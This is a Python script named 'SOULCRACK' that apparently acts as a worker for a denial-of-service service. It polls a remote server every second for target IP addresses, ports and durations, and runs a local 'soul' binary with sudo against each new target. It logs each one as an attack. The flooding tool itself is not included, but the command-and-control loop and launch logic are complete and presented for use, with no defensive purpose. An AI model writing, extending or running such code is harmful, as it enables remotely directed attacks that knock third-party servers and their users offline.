

import sys
import os
import time
import json
import hashlib
import subprocess
import requests
from datetime import datetime
import threading

class SoulMonitor:
    def __init__(self, username, api_url="https://hingoli.io/soul/soul.php"):
        self.username = username
        self.api_url = api_url
        self.headers = {'User-Agent': 'SOULCRACK'}
        self.attack_log_file = "attack.txt"
        self.processed_hashes = set()
        self.running = True
        

        self.load_attack_log()
    
    def load_attack_log(self):

        if os.path.exists(self.attack_log_file):
            try:
                with open(self.attack_log_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            
                            attack_hash = hashlib.md5(line.encode()).hexdigest()
                            self.processed_hashes.add(attack_hash)
                print(f"[*] Loaded {len(self.processed_hashes)} attacks from {self.attack_log_file}")
            except Exception as e:
                print(f"[!] Error loading attack log: {e}")
    
    def log_attack(self, ip, port, duration):

        attack_string = f"{ip}:{port}:{duration}"
        attack_hash = hashlib.md5(attack_string.encode()).hexdigest()
        

        if attack_hash in self.processed_hashes:
            return False
        

        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.attack_log_file, 'a') as f:
                f.write(f"{timestamp} | {attack_string}\n")
            
            self.processed_hashes.add(attack_hash)
            print(f"[√] Logged attack to {self.attack_log_file}")
            return True
        except Exception as e:
            print(f"[!] Failed to log attack: {e}")
            return False
    
    def is_duplicate_attack(self, ip, port, duration):

        attack_string = f"{ip}:{port}:{duration}"
        attack_hash = hashlib.md5(attack_string.encode()).hexdigest()
        return attack_hash in self.processed_hashes
    
    def get_connections(self):

        try:
            url = f"{self.api_url}/{self.username}"
            response = requests.get(url, headers=self.headers, timeout=10)
            response.raise_for_status()
            return response.json()
        except Exception as e:
            print(f"[!] API Error: {e}")
            return []
    
    def execute_soul_command(self, ip, port, duration):

        try:
            cmd = ["sudo", "./soul", ip, port, duration]
            print(f"[+] Executing: {' '.join(cmd)}")
            

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            

            def monitor_process(proc, conn_id):
                stdout, stderr = proc.communicate()
                if stdout:
                    print(f"[{conn_id}] Output: {stdout.strip()}")
                if stderr:
                    print(f"[{conn_id}] Error: {stderr.strip()}")
                print(f"[{conn_id}] Process finished")
            
            conn_id = f"{ip}:{port}"
            thread = threading.Thread(
                target=monitor_process,
                args=(process, conn_id)
            )
            thread.daemon = True
            thread.start()
            
            return True
        except Exception as e:
            print(f"[!] Failed to execute command: {e}")
            return False
    
    def process_connection(self, connection):

        ip = connection.get('ip', '')
        port = connection.get('port', '')
        duration = connection.get('time', '')
        
        if not all([ip, port, duration]):
            print(f"[!] Invalid connection data: {connection}")
            return False
        

        if self.is_duplicate_attack(ip, port, duration):
            print(f"[.] Skipping duplicate attack: {ip}:{port}:{duration}")
            return False
        
        print(f"[+] New connection detected:")
        print(f"    IP: {ip}")
        print(f"    Port: {port}")
        print(f"    Time: {duration}s")

        if not self.log_attack(ip, port, duration):
            print(f"[!] Failed to log attack")
            return False
        

        if not self.execute_soul_command(ip, port, duration):
            print(f"[!] Failed to execute command")
            return False
        
        print(f"[√] Attack started: {ip}:{port}:{duration}s")
        return True
    
    def monitor(self, check_interval=1):

        print(f"[*] Starting SOULCRACK Monitor for user: {self.username}")
        print(f"[*] API URL: {self.api_url}/{self.username}")
        print(f"[*] Attack log: {self.attack_log_file}")
        print(f"[*] Checking every {check_interval} seconds")
        print("=" * 50)
        
        try:
            while self.running:
                current_time = datetime.now().strftime("%H:%M:%S")
                connections = self.get_connections()
                
                if not connections:
                    print(f"[{current_time}] No active connections")
                else:
                    print(f"[{current_time}] Found {len(connections)} connection(s)")
                    
                    processed_count = 0
                    for conn in connections:
                        if self.process_connection(conn):
                            processed_count += 1
                        print("-" * 40)
                    
                    if processed_count > 0:
                        print(f"[√] Processed {processed_count} new connection(s)")
                
                time.sleep(check_interval)
                
        except KeyboardInterrupt:
            print("\n[!] Monitoring stopped by user")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
    
    def show_stats(self):

        if os.path.exists(self.attack_log_file):
            with open(self.attack_log_file, 'r') as f:
                attacks = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            unique_attacks = len(set([hashlib.md5(line.encode()).hexdigest() for line in attacks]))
            print(f"[*] Total attacks logged: {len(attacks)}")
            print(f"[*] Unique attacks: {unique_attacks}")
        else:
            print("[*] No attack log found")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 soul.py <username>")
        print("Example: python3 soul.py soul")
        sys.exit(1)
    
    username = sys.argv[1]
    

    print("=" * 60)
    print("SOULCRACK API MONITOR WITH ATTACK LOGGING")
    print("=" * 60)
    
    monitor = SoulMonitor(username)
    
    try:
        monitor.monitor()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    finally:
        monitor.show_stats()

if __name__ == "__main__":
    main()
